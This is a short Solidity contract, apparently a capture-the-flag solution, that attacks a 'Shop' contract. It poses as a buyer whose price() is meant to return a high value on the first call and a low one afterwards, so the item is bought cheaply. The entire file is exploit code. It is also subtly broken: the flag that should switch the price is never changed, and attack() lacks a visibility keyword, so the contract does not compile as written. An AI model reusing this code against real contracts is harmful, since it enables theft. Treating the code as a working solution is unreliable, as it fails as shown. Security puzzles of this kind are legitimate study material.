pragma solidity ^0.8.11;

import "./Shop.sol";

contract ShopAttack is Buyer {
    Shop private _victim;
    bool private isFirstTime = true;

    constructor(address payable victim) {
        _victim = Shop(victim);
    }

    function attack() {
        _victim.buy();
    }

    function price() external view returns (uint256) {
        if (isFirstTime) {
            return 101;
        } else {
            return 1;
        }
    }
}
